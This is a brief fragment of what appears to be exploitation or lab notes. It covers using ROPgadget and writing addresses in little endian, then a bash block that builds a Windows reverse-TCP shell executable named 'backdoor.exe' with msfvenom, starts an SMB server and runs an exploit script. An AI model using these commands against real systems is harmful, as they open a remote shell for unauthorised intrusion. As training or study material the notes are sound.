...
Or using [ROPGadget]([url](https://github.com/JonathanSalwan/ROPgadget)). Remember to write the address in little endian and in python binary format. So 0x12345678 should become ```\x78\x56\x34\x12```.
...
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe
smbserver -smb2support 
python 49116.py 
```
